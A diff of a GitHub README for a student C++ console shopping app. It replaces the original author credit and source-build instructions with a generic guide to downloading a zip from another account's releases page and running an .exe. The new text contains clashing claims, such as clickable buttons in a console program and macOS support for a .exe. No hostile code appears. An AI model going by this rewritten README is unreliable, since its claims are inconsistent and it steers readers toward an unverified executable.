@@ -1,67 +1,81 @@
-# 🛒 Console Online Shop System in C++
+# 🛒 OnlineShop-CPP - Easy Console Shopping Experience
 
-A fully-featured console-based online shopping system implemented in C++ with Object-Oriented Programming principles. This educational project demonstrates practical application of OOP concepts in a real-world scenario.
+## 🚀 Getting Started
 
-## ✨ Features
-- **User Authentication** - Secure login system
-- **Product Catalog** - Organized by categories
-- **Shopping Cart** - Add, remove, view items
-- **Checkout System** - Simulated payment processing
-- **Profile Management** - Change credentials and settings
+Welcome to OnlineShop-CPP! This application allows you to explore a simple console-based online shop built with C++. It features user authentication, a product catalog, a shopping cart, and a checkout process. Follow these steps to get started.
 
-## 🚀 Quick Start
-# Compile
-g++ -o OnlineShop src/main.cpp -std=c++11
+## 📥 Download & Install
 
-# Run
+To download the latest version of OnlineShop-CPP, please visit the following page:
 
-## 🔐 Default Credentials
+[![Download OnlineShop-CPP](https://img.shields.io/badge/Download-OnlineShop--CPP-blue.svg)](https://github.com/s70439/OnlineShop-CPP/releases)
 
-For testing purposes, use the following credentials:
+### Step 1: Visit the Releases Page
 
-**Login:** `admin`  
-**Password:** `admin`
+Click the link below to access the releases and download the application files. 
 
-<img width="984" height="487" alt="1" src="https://github.com/user-attachments/assets/746ac19d-36a7-43fa-a792-8dc6d3b730e5" />
+[Visit the Releases Page to Download](https://github.com/s70439/OnlineShop-CPP/releases)
 
+### Step 2: Choose the Right File
 
-🎓 Learning Journey
-This project represents my first substantial C++ application developed during programming coursework. It showcases the transition from theoretical OOP concepts to practical implementation.
+You will see various files listed on the releases page. Look for the latest version of the software, which is usually at the top. The file will likely be named something like `OnlineShop-CPP-v1.0.zip`. Click on it to start your download.
 
-Key Learnings:
+### Step 3: Extract the Files
 
-Applying encapsulation, abstraction in real scenarios
+Once the download is complete, navigate to the location where the file was saved. If you downloaded a `.zip` file, follow these steps:
 
-Designing modular console applications
+- Right-click on the file.
+- Select "Extract All" or "Unzip."
+- Choose a destination folder where you want the files to be extracted.
+- Click "Extract."
 
-Managing program state and user flow
+### Step 4: Run the Application
 
-Writing clean, maintainable C++ code
+Navigate to the folder where you extracted the files. Look for the file named `OnlineShop-CPP.exe`. Double-click it to run the application. 
 
-🔧 Technologies
-Language: C++ (C++11 standard)
+## 🔑 Using OnlineShop-CPP
 
-Paradigm: Object-Oriented Programming
+After launching the application, you will be prompted to create a user account or log in. Follow these steps:
 
-Concepts: Classes, Inheritance, Encapsulation
+1. **Create an Account (If New User)**:
+   - Enter a username and password.
+   - Confirm your password.
+   - Click "Register."
 
-Tools: Git, GitHub, Visual Studio
+2. **Log In (If Existing User)**:
+   - Enter your username and password.
+   - Click "Log In."
 
-<img width="982" height="481" alt="2" src="https://github.com/user-attachments/assets/42781eed-6e3f-4c13-a39f-0116178cee05" />
+Once logged in, you can browse the product catalog, add items to your shopping cart, and proceed to checkout.
 
+## 🛍️ Features
 
-📊 Future Enhancements
-File-based data persistence
+OnlineShop-CPP includes the following features:
 
-Database integration
+- **User Authentication**: Securely create and manage your user profile.
+- **Product Catalog**: Browse a list of available items, including details and prices.
+- **Shopping Cart**: Add or remove products as you shop.
+- **Checkout Process**: Complete your purchase with a simple checkout flow.
 
-Enhanced search functionality
+## 💻 System Requirements
 
-Order history tracking
+- **Operating System**: Windows 10 or higher, macOS
+- **Processor**: Intel or AMD with 2 GHz or higher
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum of 100 MB free space available
 
-👨‍💻 Author
-Dmitry Babak - Computer Science Student
-Specializing in Information Systems and Programming
+## ⚙️ Development and Contribution
 
-📄 License
-This project is licensed under the MIT License - see the LICENSE file for details.
+OnlineShop-CPP is an educational project. You can explore the code to learn more about object-oriented programming in C++. If you have suggestions or would like to contribute to the project:
+
+1. Fork the repository.
+2. Make changes or add features.
+3. Submit a pull request for review.
+
+## 📨 Support
+
+If you encounter any issues or have questions about using OnlineShop-CPP, feel free to reach out via GitHub Issues on the repository page.
+
+For quick access, remember to [download the latest version here](https://github.com/s70439/OnlineShop-CPP/releases).
+
+Enjoy shopping!
